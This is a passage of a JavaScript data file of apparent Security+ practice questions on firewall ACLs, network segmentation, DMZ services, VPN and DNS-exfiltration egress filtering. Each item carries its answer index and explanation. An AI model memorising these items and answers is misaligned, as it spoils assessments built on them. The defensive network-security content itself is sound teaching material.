    exhibit:"  <span class='cy'>Admin (Internet)</span>\n        |  VPN\n        v\n   +---------+\n   |  NGFW   |\n   +----+----+\n        |\n   <span class='ok'>Jump Host</span> 10.10.0.5\n        |\n   Internal Servers 10.10.5.0/24\n\n# ACT   SRC          DST            PORT  PROTO\n1 PERMIT 10.10.0.5   10.10.5.0/24   ____  TCP\n2 ____   any         10.10.5.0/24   22    TCP\n3 <span class='dim'>...implicit deny...</span>",
    fields:[
      { label:"Rule 1 management PORT (Linux servers)", hint:"Secure shell.", options:["22","21","25","23"], answer:0, explain:"SSH (TCP 22) is the secure remote management port; Telnet (23) is plaintext and must not be used." },
      { label:"Rule 2 ACTION (any -> internal servers on 22)", hint:"Only the jump host should reach SSH.", options:["Permit","Deny","Permit with logging","Redirect"], answer:1, explain:"All SSH not originating from the jump host must be denied so admins are forced through the bastion." },
      { label:"Best practice this enforces", options:["Geofencing of DNS","Port knocking","Defense in depth via a single choke point (jump host)","Load balancing"], answer:2, explain:"Funneling all admin access through one hardened, monitored bastion is a controlled choke point reducing attack surface." },
      { label:"Why deny direct Internet RDP (3389) to servers", hint:"3389 is heavily scanned.", options:["RDP uses UDP only","It conserves IP addresses","RDP is faster than SSH","Exposed 3389 is a top ransomware entry vector and should never face the Internet"], answer:3, explain:"Internet-exposed RDP (3389) is constantly brute-forced and a leading ransomware entry point; it must be reachable only via the bastion/VPN." }
    ],
    summary:"Permit only the jump host to SSH internal servers and deny all other access, forcing admins through the monitored bastion."
  },
  {
    id:"PBQ-003", format:1, domain:3,
    title:"Database VLAN Isolation",
    brief:"A three-tier app has a web tier in the DMZ and a database on an isolated VLAN. Only the application server should reach the database, and only on the database port. Complete the ACL protecting the DB VLAN.",
    exhibitTitle:"fw0://acl",
    exhibit:" <span class='warnc'>Web/App</span> 10.30.1.20\n      |\n   +------+\n   | NGFW |\n   +--+---+\n      |\n <span class='hl'>DB-VLAN</span> 10.30.9.0/24\n  db-srv 10.30.9.10\n\n# ACT   SRC          DST           PORT  PROTO\n1 PERMIT 10.30.1.20  10.30.9.10    ____  TCP\n2 DENY   any         10.30.9.0/24  ____  any\n3 <span class='dim'>...implicit deny...</span>",
    fields:[
      { label:"Rule 1 DATABASE PORT (MySQL/MariaDB)", hint:"Standard MySQL listener.", options:["3306","5432","1521","1433"], answer:0, explain:"MySQL/MariaDB listens on TCP 3306; 1433 is MSSQL and 5432 is PostgreSQL." },
      { label:"Rule 1 ACTION", options:["Deny","Permit","Reject","Log"], answer:1, explain:"Only the app server is permitted to the DB; this single permit precedes the broad deny." },
      { label:"Rule 2 PORT field for the broad block", hint:"Block everything else to the DB VLAN.", options:["3306 only","443 only","any","53 only"], answer:2, explain:"After permitting the app server, deny all other traffic to the DB VLAN on any port to enforce least privilege." },
      { label:"Security principle demonstrated", options:["Fail-open design","Round-robin DNS","Split tunneling","Least privilege / micro-segmentation"], answer:3, explain:"Allowing only one source to one port on the DB VLAN is least privilege enforced through segmentation." }
    ],
    summary:"Permit only the app server to the DB on TCP 3306 and deny all other traffic to the database VLAN."
  },
  {
    id:"PBQ-004", format:1, domain:3,
    title:"Cloud Security Group for a Web App",
    brief:"You are tuning an AWS-style security group for a public web tier behind a load balancer. Inbound web traffic is allowed; SSH must be restricted to the corporate egress IP only. Complete the inbound rules.",
    exhibitTitle:"sg://web-tier/inbound",
    exhibit:"  <span class='cy'>Internet</span> -> <span class='ok'>ALB</span> -> SG(web-tier)\n  Corp office egress: 198.51.100.7/32\n\nSG INBOUND RULES\n# ACT    SRC                PORT  PROTO\n1 ALLOW  0.0.0.0/0          ____  TCP\n2 ALLOW  198.51.100.7/32    ____  TCP\n3 <span class='dim'>(implicit deny all)</span>",
    fields:[
      { label:"Rule 1 PORT (public web over TLS)", options:["443","3389","21","8080"], answer:0, explain:"Public web traffic should be HTTPS on TCP 443 from anywhere." },
      { label:"Rule 2 PORT (admin access)", hint:"Restricted management.", options:["123","22","80","443"], answer:1, explain:"SSH (TCP 22) is the admin port and is scoped to the single corporate /32 source." },
      { label:"Why scope SSH to /32 instead of 0.0.0.0/0", options:["Enables IPv6","Saves bandwidth","Least privilege: limits the SSH attack surface to one known source","Required for TLS"], answer:2, explain:"Restricting SSH to a single known IP applies least privilege and drastically shrinks the brute-force attack surface." },
      { label:"In cloud SGs, what enforces the final 'deny'?", hint:"SGs are stateful allow-lists.", options:["A NACL only","Nothing; all is allowed","An explicit deny rule you must add","The implicit deny: anything not allowed is dropped"], answer:3, explain:"Security groups are allow-lists; any traffic not explicitly allowed is implicitly denied." }
    ],
    summary:"Allow 443 from anywhere and 22 only from the corporate /32, letting the security group's implicit deny block all else."
  },
  {
    id:"PBQ-005", format:1, domain:3,
    title:"Segmenting an OT/SCADA Network",
    brief:"An industrial control (OT) network must be isolated from the corporate IT LAN. Only a specific historian server may poll PLCs, and OT devices must never reach the Internet. Build the segmentation ACL.",
    exhibitTitle:"fw0://acl",
    exhibit:" <span class='cy'>Corporate IT</span> 10.1.0.0/16\n      |\n   +------+\n   | NGFW |\n   +--+---+\n      |\n <span class='hl'>OT / SCADA</span> 10.99.0.0/24\n  PLCs + Historian 10.1.50.40\n\n# ACT   SRC          DST            PORT  PROTO\n1 PERMIT 10.1.50.40  10.99.0.0/24   502   TCP\n2 ____   10.99.0.0/24 0.0.0.0/0     any   any\n3 <span class='dim'>...implicit deny...</span>",
    fields:[
      { label:"Rule 1 protocol on port 502 (Modbus)", hint:"Industrial polling protocol.", options:["Permits the historian to poll PLCs via Modbus/TCP","Allows web browsing","Enables RDP","Provides DNS"], answer:0, explain:"Modbus/TCP uses port 502; permitting only the historian to PLCs allows monitoring with least privilege." },
      { label:"Rule 2 ACTION (OT subnet -> Internet)", hint:"OT should be air-gapped from the Internet.", options:["Permit","Deny","NAT","Forward"], answer:1, explain:"OT/SCADA devices must not reach the Internet; this egress block prevents C2 and exfiltration." },
      { label:"Best-practice model for this design", options:["DMZ-less design","Flat network","Purdue model / zoned segmentation between IT and OT","Single broadcast domain"], answer:2, explain:"Separating IT and OT into zones with controlled conduits reflects the Purdue reference model for ICS security." },
      { label:"Risk if OT and IT share one flat VLAN", options:["Better compliance","No risk","Lower latency only","Malware in IT can pivot directly to PLCs, risking safety and uptime"], answer:3, explain:"A flat network lets commodity malware reach fragile control systems, threatening physical safety and availability." }
    ],
    summary:"Permit only the historian to PLCs on Modbus/TCP 502, deny OT egress to the Internet, and rely on the implicit deny."
  },
  {
    id:"PBQ-006", format:1, domain:3,
    title:"Blocking Data Exfiltration over DNS",
    brief:"Endpoints should only use the internal DNS resolver. Attackers are tunneling data out via direct DNS to external servers. Configure egress rules to force all DNS through the internal resolver and block rogue DNS.",
    exhibitTitle:"fw0://acl",
    exhibit:" Endpoints 10.10.0.0/16\n      |\n   +------+\n   | NGFW | egress\n   +--+---+\n      |\n  <span class='cy'>Internet</span>\n  Internal resolver: 10.10.0.53\n\n# ACT   SRC          DST            PORT  PROTO\n1 PERMIT 10.10.0.0/16 10.10.0.53    53    ____\n2 ____   10.10.0.0/16 0.0.0.0/0     53    any\n3 <span class='dim'>...other egress rules...</span>",
    fields:[
      { label:"Rule 1 PROTOCOL for DNS queries", hint:"DNS primarily uses this transport.", options:["UDP (and TCP for large responses)","ICMP","GRE","TCP only"], answer:0, explain:"DNS uses UDP 53 for most queries (TCP 53 for zone transfers/large responses); permit it to the internal resolver." },
      { label:"Rule 2 ACTION (endpoints -> any external :53)", hint:"Stop DNS tunneling/exfiltration.", options:["Permit","Deny","Translate","Mirror"], answer:1, explain:"Denying direct outbound DNS to arbitrary servers forces clients to the inspected internal resolver and blocks tunneling." },
      { label:"This control is best described as", options:["Port forwarding","NAT hairpinning","DNS exfiltration prevention via egress filtering","Ingress filtering"], answer:2, explain:"Restricting outbound DNS to a sanctioned resolver is egress filtering aimed at preventing DNS-based exfiltration." },
      { label:"Indicator suggesting DNS tunneling", options:["NTP sync traffic","ARP requests","Short A-record lookups to known sites","Long, high-entropy subdomain queries at high volume to one domain"], answer:3, explain:"Frequent, lengthy, high-entropy subdomain queries to a single domain are a classic sign of DNS tunneling/exfiltration." }
    ],
    summary:"Permit DNS only to the internal resolver on UDP/TCP 53 and deny all other outbound port 53 to stop DNS tunneling."
  },
  {
    id:"PBQ-007", format:1, domain:3,
    title:"DMZ Mail Relay Hardening",
    brief:"A DMZ SMTP relay accepts inbound mail and forwards to the internal mail store. It must accept SMTP from the Internet but only forward to the internal Exchange server, never to arbitrary internal hosts.",
    exhibitTitle:"fw0://acl",
    exhibit:"  <span class='cy'>Internet</span>\n      |\n   +------+\n   | NGFW |\n   +--+---+\n   |      |\n <span class='warnc'>DMZ relay</span>   Internal\n 192.0.2.25   Exchange 10.10.7.25\n\n# ACT   SRC          DST           PORT  PROTO\n1 PERMIT any         192.0.2.25    ____  TCP\n2 PERMIT 192.0.2.25  10.10.7.25    25    TCP\n3 ____   192.0.2.25  10.10.0.0/16  any   any\n4 <span class='dim'>...implicit deny...</span>",
    fields:[
      { label:"Rule 1 inbound SMTP PORT", options:["25","143","993","110"], answer:0, explain:"SMTP delivery uses TCP 25; the relay must accept it from the Internet." },
      { label:"Rule 2 purpose", options:["Allows DNS","Lets the relay forward mail only to the internal Exchange host","Permits web traffic","Opens RDP"], answer:1, explain:"The relay forwards accepted mail to exactly one internal mail store on SMTP 25, limiting its reach." },
      { label:"Rule 3 ACTION (relay -> rest of internal LAN)", hint:"Constrain a possibly compromised relay.", options:["Forward","Permit","Deny","Permit logged"], answer:2, explain:"Beyond the one mail host, the relay should not reach any internal system; deny limits blast radius if compromised." },
      { label:"Why place the relay in the DMZ rather than the LAN", options:["To avoid licensing","Because DMZ has more bandwidth","For faster mail","To expose an Internet-facing service while isolating it from the trusted LAN"], answer:3, explain:"Internet-facing services belong in the DMZ so a compromise does not directly land an attacker on the internal network." }
    ],
    summary:"Permit inbound SMTP to the relay, allow it to forward only to the internal Exchange host, and deny it any other internal access."
  },
  {
    id:"PBQ-008", format:1, domain:3,
    title:"IoT VLAN Containment",
    brief:"Smart cameras and sensors sit on an IoT VLAN. They must reach only their cloud management endpoint over HTTPS and must not talk to corporate workstations. Build the containment ACL.",
    exhibitTitle:"fw0://acl",
    exhibit:" <span class='hl'>IoT VLAN</span> 10.50.0.0/24\n      |\n   +------+\n   | NGFW |\n   +--+---+\n   |      |\n Corp LAN   Internet\n 10.10.0.0/16  cloud-mgmt\n\n# ACT   SRC          DST            PORT  PROTO\n1 PERMIT 10.50.0.0/24 cloud-mgmt    443   TCP\n2 ____   10.50.0.0/24 10.10.0.0/16  any   any\n3 <span class='dim'>...implicit deny...</span>",
    fields:[
      { label:"Rule 1 PORT (cloud management)", options:["443","23","8883","80"], answer:0, explain:"The devices reach their cloud manager over HTTPS (TCP 443); plaintext alternatives should be avoided." },
      { label:"Rule 2 ACTION (IoT -> Corp LAN)", hint:"Keep weak IoT devices away from workstations.", options:["Permit","Deny","Permit DNS only","Forward"], answer:1, explain:"IoT devices are often poorly patched; denying them access to the corporate LAN contains the threat." },
      { label:"Primary reason IoT gets its own VLAN", options:["To enable PoE","Cheaper switches","To segment frequently-vulnerable devices away from sensitive systems","Higher throughput"], answer:2, explain:"IoT gear is commonly insecure; isolating it on its own segment limits the damage of a compromise." },
      { label:"After Rule 1 and 2, IoT Internet access to other sites is", options:["Allowed on port 80","Unrestricted","Allowed to everything","Blocked by the implicit deny (only 443 to cloud-mgmt is permitted)"], answer:3, explain:"Only the explicit permit to the cloud manager survives; all other destinations hit the implicit deny." }
    ],
    summary:"Permit IoT devices only to their cloud manager on 443, deny them the corporate LAN, and let implicit deny block the rest."
  },
  {
    id:"PBQ-009", format:1, domain:3,
    title:"Rule Order and Shadowed Rules",
    brief:"An analyst added a permit rule below a broad deny, and it never takes effect. Diagnose the ordering problem and fix the ACL so the intended HTTPS permit works while still blocking a malicious subnet.",
    exhibitTitle:"fw0://acl",
    exhibit:"Top-down evaluation (first match wins)\n\n# ACT   SRC            DST          PORT PROTO\n1 DENY  0.0.0.0/0      10.10.7.10   any  any   <span class='hl'>(too broad)</span>\n2 PERMIT 203.0.113.0/24 10.10.7.10  443  TCP   <span class='dim'>(never reached)</span>\n3 <span class='dim'>...implicit deny...</span>\n\nGoal: allow 203.0.113.0/24 to HTTPS,\n      block known-bad 198.51.100.66/32",
    fields:[
      { label:"Why does Rule 2 never match?", options:["Rule 1 denies all sources first, shadowing the later permit","TCP is invalid","Subnet mask error","Wrong port"], answer:0, explain:"Because evaluation is first-match top-down, the broad Rule 1 deny matches everything and shadows the specific permit below it." },
      { label:"Correct fix", options:["Delete the implicit deny","Reorder: put the specific permit (and a narrow deny of the bad /32) above the broad deny","Change 443 to 80","Add NAT"], answer:1, explain:"Specific rules must precede broader ones; place the targeted permit and the bad-host deny above any catch-all." },
      { label:"New Rule 1 should be (most specific deny)", options:["DENY 0.0.0.0/0 any","PERMIT 0.0.0.0/0 443","DENY 198.51.100.66/32 -> 10.10.7.10 any","PERMIT any any"], answer:2, explain:"Block the single known-bad host explicitly and first, so it is dropped before the broader permit." },
      { label:"General ACL ordering principle", options:["Random order is fine","Permits always last","Broadest rules first","Most specific rules first, broadest/deny-all last"], answer:3, explain:"Order from most specific to least specific, ending with the implicit/explicit deny-all to avoid shadowed rules." }
    ],
    summary:"Reorder so the specific bad-host deny and the HTTPS permit sit above the broad deny, since first-match wins."
  },
  {
    id:"PBQ-010", format:1, domain:3,
    title:"Site-to-Site VPN Tunnel Endpoints",
    brief:"Configure firewall rules to permit an IPsec site-to-site VPN between two branch firewalls while keeping all other inbound traffic blocked.",
    exhibitTitle:"fw0://acl",
    exhibit:"  Branch A FW            Branch B FW\n  198.51.100.1  ====VPN====  203.0.113.1\n         |                       |\n   LAN-A 10.1.0.0/16      LAN-B 10.2.0.0/16\n\n# ACT    SRC            DST           PORT PROTO\n1 PERMIT 203.0.113.1    198.51.100.1  500  ____\n2 PERMIT 203.0.113.1    198.51.100.1  ---  ESP\n3 <span class='dim'>...implicit deny inbound...</span>",
    fields:[
      { label:"Rule 1 PROTOCOL for IKE negotiation on 500", options:["UDP","ICMP","ESP","TCP"], answer:0, explain:"IKE key exchange uses UDP 500 (and UDP 4500 for NAT-T)." },
      { label:"Rule 2 protocol ESP refers to", options:["Encrypted SSH Proxy","Encapsulating Security Payload (the IPsec data protocol)","Extended SMTP","Ethernet Spanning Protocol"], answer:1, explain:"ESP (IP protocol 50) carries the encrypted IPsec payload between the tunnel endpoints." },
      { label:"Which extra port is needed when NAT is between the peers?", options:["UDP 53","TCP 22","UDP 4500 (NAT-T)","TCP 443"], answer:2, explain:"NAT Traversal encapsulates ESP in UDP 4500 so IPsec survives NAT devices." },
      { label:"Scope of the VPN permits", options:["From the whole Internet","From LAN-A broadcast","From any source to the peer","Only between the two specific peer public IPs"], answer:3, explain:"Tunnel rules should be scoped to the exact peer IPs, not any source, to minimize exposure." }
    ],
    summary:"Permit UDP 500 and ESP (plus UDP 4500 with NAT) only between the two VPN peer IPs and deny all other inbound."
  },
  {
    id:"PBQ-011", format:1, domain:3,
    title:"Guest Wi-Fi Isolation",
    brief:"Guest wireless clients should reach only the Internet and never internal resources. Build an ACL that allows Internet web/DNS but blocks any path to corporate subnets.",
    exhibitTitle:"fw0://acl",
    exhibit:" <span class='warnc'>Guest WLAN</span> 172.16.50.0/24\n      |\n   +------+\n   | NGFW |\n   +--+---+\n   |      |\n Corp 10.0.0.0/8   Internet\n\n# ACT   SRC            DST          PORT PROTO\n1 ____  172.16.50.0/24 10.0.0.0/8   any  any\n2 PERMIT 172.16.50.0/24 0.0.0.0/0   ____ TCP\n3 PERMIT 172.16.50.0/24 0.0.0.0/0   53   UDP\n4 <span class='dim'>...implicit deny...</span>",
    fields:[
      { label:"Rule 1 ACTION (guest -> corporate)", hint:"This rule must come first.", options:["Deny","Forward","NAT","Permit"], answer:0, explain:"Block guests from all corporate subnets before permitting Internet access, preventing access to internal resources." },
      { label:"Rule 2 PORT(s) for web browsing", hint:"HTTP and HTTPS.", options:["Only 21","80 and 443","Only 25","Only 3389"], answer:1, explain:"Guest web browsing needs HTTP 80 and HTTPS 443 outbound to the Internet." },
      { label:"Why must the corporate-deny rule precede the Internet-permit", options:["No reason","Performance","First-match evaluation: a 0.0.0.0/0 permit would otherwise include corporate ranges","To save IPs"], answer:2, explain:"Since 0.0.0.0/0 includes RFC1918 corporate ranges, the specific corporate deny must be evaluated first." },
      { label:"Security goal of guest isolation", options:["Reduce DNS load","Enable printing","Faster guest speeds","Prevent untrusted guest devices from touching internal/sensitive systems"], answer:3, explain:"Guest networks isolate untrusted devices so they cannot reach or attack internal corporate systems." }
    ],
    summary:"Deny guests to all corporate subnets first, then permit only outbound web (80/443) and DNS (53) to the Internet."
  },
  {
    id:"PBQ-012", format:1, domain:3,
    title:"Reverse Proxy / WAF Placement",
    brief:"Web requests should terminate at a WAF/reverse proxy in the DMZ, which alone forwards to the backend app server. Direct client-to-backend traffic must be impossible.",
    exhibitTitle:"topology.map",
    exhibit:"  <span class='cy'>Clients</span>\n     |\n  +------+\n  | NGFW |\n  +--+---+\n     |\n  <span class='ok'>WAF/Reverse Proxy</span> 192.0.2.80 (DMZ)\n     |\n  App server 10.10.8.80 (internal)\n\n# ACT   SRC          DST          PORT PROTO\n1 PERMIT any         192.0.2.80   443  TCP\n2 PERMIT 192.0.2.80  10.10.8.80   ____ TCP\n3 ____   any         10.10.8.80   any  any\n4 <span class='dim'>...implicit deny...</span>",
    fields:[
      { label:"Rule 2 backend PORT (proxy -> app)", hint:"Internal app listener in this design.", options:["8080","22","3306","161"], answer:0, explain:"The reverse proxy forwards to the backend app on its listener (8080 here); only the proxy may do so." },
      { label:"Rule 3 ACTION (clients -> backend directly)", options:["Permit","Deny","Forward","Log only"], answer:1, explain:"Clients must never reach the backend directly; only the WAF/proxy is allowed, so deny direct access." },
      { label:"Security benefit of a WAF reverse proxy", options:["Provides DHCP","Caches DNS","Inspects/filters HTTP attacks and hides the backend's identity","Speeds up SSH"], answer:2, explain:"A WAF inspects HTTP for injection/XSS and shields the backend, which is never exposed directly." },
      { label:"This pattern is an example of", options:["Single-factor design","Open relay","Flat trust","Defense in depth with a screened DMZ tier"], answer:3, explain:"Layering a DMZ WAF in front of an isolated backend adds an inspection layer and enforces segmentation." }
    ],
    summary:"Permit clients to the WAF on 443, let only the WAF reach the backend on 8080, and deny any direct client-to-backend traffic."
  },
  {
    id:"PBQ-013", format:1, domain:3,
    title:"Egress Filtering to Block Malware C2",
    brief:"To curb beaconing malware, outbound traffic from workstations should be restricted to required services only. Build a default-deny egress policy permitting just web and DNS via approved paths.",
    exhibitTitle:"fw0://acl",
    exhibit:" Workstations 10.20.0.0/16\n      |\n   +------+\n   | NGFW | egress\n   +--+---+\n      |\n   <span class='cy'>Internet</span>\n\n# ACT   SRC          DST         PORT       PROTO\n1 PERMIT 10.20.0.0/16 proxy       8080       TCP\n2 PERMIT 10.20.0.0/16 10.20.0.53  53         UDP\n3 ____   10.20.0.0/16 0.0.0.0/0   ____       any\n4 <span class='dim'>(implicit deny)</span>",
    fields:[
      { label:"Rule 3 ACTION (workstation -> any other Internet)", hint:"Default egress posture.", options:["Deny","NAT","Mirror","Permit"], answer:0, explain:"A default-deny egress drops any outbound traffic not explicitly permitted, blocking arbitrary C2 channels." },
      { label:"Rule 1 forces web traffic through the", options:["Open Internet","Authenticated/inspecting proxy on 8080","Database","VPN concentrator"], answer:1, explain:"Routing web access through a proxy enables inspection and logging and blocks direct outbound web." },
      { label:"How default-deny egress hurts malware", options:["It rotates keys","It encrypts payloads","It blocks unsanctioned outbound ports/destinations used for beaconing","It speeds boot time"], answer:2, explain:"Most malware needs to call out; restricting egress to approved services/ports denies its command-and-control." },
      { label:"Rule 3 PORT field for the catch-all block", options:["53 only","8080 only","443 only","any"], answer:3, explain:"The catch-all egress deny applies to any port/destination not previously permitted." }
    ],
    summary:"Permit only proxied web (8080) and internal DNS (53), then default-deny all other egress to starve malware C2."
  },
  {
    id:"PBQ-014", format:1, domain:3,
    title:"Screened Subnet for FTP/SFTP Service",
    brief:"Partners must upload files to a server in a screened subnet using SFTP only. Plaintext FTP must be blocked, and the server must not reach the internal LAN. Complete the ACL.",
    exhibitTitle:"fw0://acl",
    exhibit:"  <span class='cy'>Partners (Internet)</span>\n        |\n   +------+\n   | NGFW |\n   +--+---+\n   |      |\n <span class='warnc'>Screened subnet</span>  Internal LAN\n sftp-srv 192.0.2.22  10.10.0.0/16\n\n# ACT   SRC          DST          PORT PROTO\n1 PERMIT any         192.0.2.22   ____ TCP\n2 DENY  any          192.0.2.22   21   TCP\n3 ____  192.0.2.22   10.10.0.0/16 any  any\n4 <span class='dim'>...implicit deny...</span>",
    fields:[
      { label:"Rule 1 PORT for SFTP (SSH File Transfer)", options:["22","69","21","20"], answer:0, explain:"SFTP runs over SSH on TCP 22; this is the secure transfer path partners should use." },
      { label:"Rule 2 blocks plaintext FTP control on", options:["22","21","443","990"], answer:1, explain:"Classic FTP control is TCP 21 and is plaintext; explicitly denying it prevents insecure transfers." },
      { label:"Rule 3 ACTION (server -> internal LAN)", options:["NAT","Permit","Deny","Forward"], answer:2, explain:"An Internet-facing transfer server in a screened subnet must not initiate connections into the trusted LAN." },
      { label:"Why prefer SFTP over FTP here", options:["FTP uses fewer ports","SFTP needs no auth","FTP is faster","SFTP encrypts credentials and data in transit; FTP sends them in plaintext"], answer:3, explain:"SFTP encrypts authentication and data over SSH, whereas FTP exposes credentials and files in cleartext." }
    ],
    summary:"Permit SFTP (TCP 22) to the screened server, explicitly deny plaintext FTP (21), and block the server from the internal LAN."
  },
  {
    id:"PBQ-015", format:1, domain:3,
    title:"Implicit Deny and Logging Verification",
    brief:"Review a near-complete ACL for a small office. Add the final catch-all behavior and a management exception correctly, applying deny-by-default and least privilege.",
    exhibitTitle:"fw0://acl",
    exhibit:"# ACT    SRC            DST            PORT PROTO\n1 PERMIT 10.0.0.0/24    0.0.0.0/0      443  TCP   <span class='ok'>web</span>\n2 PERMIT 10.0.0.0/24    10.0.0.53      53   UDP   <span class='ok'>dns</span>\n3 PERMIT 10.0.0.5       10.0.0.0/24    22   TCP   <span class='cy'>admin</span>\n4 ____   0.0.0.0/0      0.0.0.0/0      any  any   <span class='hl'>?</span>\n\nadmin host: 10.0.0.5",
    exhibitTitle2:"",
    fields:[
      { label:"Rule 4 ACTION (final catch-all)", hint:"Deny-by-default posture.", options:["Deny (preferably with logging)","Forward","Translate","Permit"], answer:0, explain:"The final rule must be an explicit deny-all, ideally logged, to enforce deny-by-default and capture anomalies." },
      { label:"Rule 3 limits SSH so that", options:["Anyone can SSH internally","Only the admin host (10.0.0.5) can SSH to the subnet","SSH is open to the Internet","SSH is fully blocked"], answer:1, explain:"Scoping SSH to a single admin host applies least privilege for management access." },
      { label:"Best reason to log the deny-all rule", options:["To disable the firewall","To speed traffic","To gain visibility into blocked/attempted unauthorized traffic","To reduce CPU"], answer:2, explain:"Logging denied traffic provides detection value and audit evidence of attempted policy violations." },
      { label:"With Rule 4 in place, unlisted inbound RDP (3389) is", options:["Redirected","Permitted from admin","Allowed","Denied by the catch-all"], answer:3, explain:"Any service not explicitly permitted, including RDP 3389, is dropped by the final deny-all." },
      { label:"Overall posture this ACL implements", options:["Deny-by-default with least-privilege exceptions","Open firewall","Stateless permit-all","Allow-by-default"], answer:0, explain:"Explicit permits for required services plus a final deny-all is the deny-by-default, least-privilege model." }
    ],
    summary:"Finish with an explicit logged deny-all so only the listed least-privilege permits pass, enforcing deny-by-default."
  }
);
SECPLUS.pbqs.push(
  {
    id: "PBQ-016",
    format: 1,
    domain: 3,
    title: "Site-to-Site VPN Tunnel ACL",
    brief: "Two branch offices are joined by an IPsec site-to-site VPN between perimeter firewalls. Build the rule that permits only the intended LAN-to-LAN traffic across the tunnel and keep everything else implicitly denied.",
    exhibitTitle: "VPN Edge Topology",
    exhibit: "  HQ LAN 10.10.0.0/16        BRANCH LAN 10.20.0.0/16\n        |                            |\n  [<span class='cy'>FW-HQ</span>]====IPsec tunnel====[<span class='cy'>FW-BR</span>]\n   203.0.113.5                  198.51.100.7\n\n<span class='dim'>IKEv2 / ESP already negotiated between the two public peers.</span>\n<span class='warnc'>Goal:</span> let HQ subnet reach Branch subnet over the tunnel only.\n\n RULE# ACTION  SOURCE        DEST          PORT  PROTO\n  10    ?       <span class='hl'>?</span>        <span class='hl'>?</span>        ANY    ?\n  99   DENY    ANY           ANY           ANY    ANY  <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 ACTION", hint: "Tunnel traffic must be explicitly allowed", options: ["Deny", "Permit", "Log only", "Reject"], answer: 1, explain: "The interesting traffic that should cross the tunnel must be explicitly permitted; all other traffic falls through to the implicit deny." },
      { label: "Rule 10 SOURCE", hint: "Originating LAN behind FW-HQ", options: ["203.0.113.5/32", "10.20.0.0/16", "10.10.0.0/16", "ANY"], answer: 2, explain: "The encrypted interesting traffic originates from the HQ internal subnet 10.10.0.0/16, not from the public peer address." },
      { label: "Rule 10 DESTINATION", hint: "Remote LAN behind FW-BR", options: ["10.20.0.0/16", "198.51.100.7/32", "10.10.0.0/16", "0.0.0.0/0"], answer: 0, explain: "The destination of tunnel traffic is the remote branch LAN 10.20.0.0/16. Using ANY would violate least privilege." },
      { label: "Tunnel transport protocol to permit on the public interface", hint: "IPsec ESP uses which IP protocol/ports", options: ["TCP 443 only", "ESP (IP 50) and UDP 500/4500", "GRE 47", "ICMP echo"], answer: 1, explain: "IPsec site-to-site needs ESP (IP protocol 50) plus UDP 500 (IKE) and UDP 4500 (NAT-T); opening 443 or GRE would not carry the tunnel." }
    ],
    summary: "Site-to-site VPN ACLs permit only the specific LAN-to-LAN subnets as interesting traffic and allow ESP/UDP 500/4500 on the public peers, with everything else implicitly denied."
  },
  {
    id: "PBQ-017",
    format: 1,
    domain: 3,
    title: "Reverse Proxy in the DMZ",
    brief: "A reverse proxy sits in the DMZ and fronts an internal web application server. Configure rules so external clients only reach the proxy and the proxy is the only host that reaches the backend.",
    exhibitTitle: "DMZ Reverse Proxy",
    exhibit: "  INTERNET ---> [<span class='cy'>FW</span>] ---> DMZ ---> [<span class='cy'>FW</span>] ---> INTERNAL\n\n  Reverse Proxy  : 172.16.5.10  (DMZ)\n  App Server     : 10.30.4.20   (Internal)\n\n RULE ACTION SOURCE         DEST           PORT PROTO\n  10   ?     ANY            <span class='hl'>172.16.5.10</span>  443  ?\n  20   ?     <span class='hl'>172.16.5.10</span> 10.30.4.20     <span class='hl'>?</span>  TCP\n  30  DENY  ANY            10.30.4.20     ANY  ANY <span class='ok'>(default)</span>",
    fields: [
      { label: "Rule 10 ACTION (Internet to proxy)", hint: "Public HTTPS should reach the proxy", options: ["Permit", "Deny", "Drop", "Quarantine"], answer: 0, explain: "External users must reach the published reverse proxy over HTTPS, so this is an explicit permit." },
      { label: "Rule 10 PROTOCOL for port 443", hint: "HTTPS transport", options: ["UDP", "ICMP", "TCP", "GRE"], answer: 2, explain: "HTTPS on 443 is carried over TCP." },
      { label: "Rule 20 ACTION (proxy to backend)", hint: "Only the proxy should reach the app server", options: ["Deny", "Permit", "Log", "Reset"], answer: 1, explain: "The proxy alone is permitted to forward requests to the internal app server; rule 30 denies everyone else." },
      { label: "Rule 20 backend PORT", hint: "Internal app listens on HTTPS", options: ["80", "3389", "443", "22"], answer: 2, explain: "Forwarding to the backend over 443 keeps the leg encrypted; the proxy is the only permitted source for that destination." },
      { label: "Best practice this design enforces", hint: "Why no direct Internet-to-backend rule", options: ["Full-mesh connectivity", "Implicit deny / least privilege keeps the backend unreachable except via the proxy", "Static NAT for all hosts", "Open egress for updates"], answer: 1, explain: "Only the proxy can reach the backend and the default deny blocks all other paths, isolating the internal app server." }
    ],
    summary: "A DMZ reverse proxy is the single published entry point: Internet reaches only the proxy on 443/TCP, the proxy alone reaches the backend, and an implicit deny protects the internal server."
  },
  {
    id: "PBQ-018",
    format: 1,
    domain: 3,
    title: "RADIUS Authentication Segmentation",
    brief: "Wireless controllers must authenticate users against a RADIUS server in the management segment. Permit only RADIUS traffic from the controllers and deny lateral access to the rest of the management VLAN.",
    exhibitTitle: "RADIUS / NAC Segment",
    exhibit: "  WLAN Controllers 10.40.1.0/24\n        |\n     [<span class='cy'>FW</span>]\n        |\n  MGMT VLAN 10.99.9.0/24  (RADIUS srv 10.99.9.50)\n\n RULE ACTION SOURCE        DEST          PORT      PROTO\n  10   ?     10.40.1.0/24  10.99.9.50    <span class='hl'>?</span>/1813 <span class='hl'>?</span>\n  20  DENY  10.40.1.0/24  10.99.9.0/24  ANY       ANY\n  99  DENY  ANY           ANY           ANY       ANY <span class='ok'>(implicit)</span>",
    fields: [
      { label: "Rule 10 ACTION", hint: "Controllers need to reach RADIUS", options: ["Deny", "Permit", "Mirror", "Throttle"], answer: 1, explain: "Authentication must succeed, so RADIUS from the controllers to the server is explicitly permitted." },
      { label: "RADIUS authentication PORT", hint: "Standard RADIUS auth port", options: ["389", "1812", "636", "3306"], answer: 1, explain: "RADIUS uses UDP 1812 for authentication and 1813 for accounting." },
      { label: "RADIUS PROTOCOL", hint: "Classic RADIUS transport", options: ["TCP", "ICMP", "UDP", "GRE"], answer: 2, explain: "Traditional RADIUS runs over UDP (1812/1813)." },
      { label: "Purpose of Rule 20", hint: "It blocks the controller subnet from the rest of MGMT", options: ["Enables full management access", "Enforces least privilege so controllers reach only the RADIUS host, not the whole VLAN", "Allows ICMP only", "Permits SSH to all servers"], answer: 1, explain: "Rule 20 denies the controllers any other management-VLAN destination, restricting them to just the RADIUS service." }
    ],
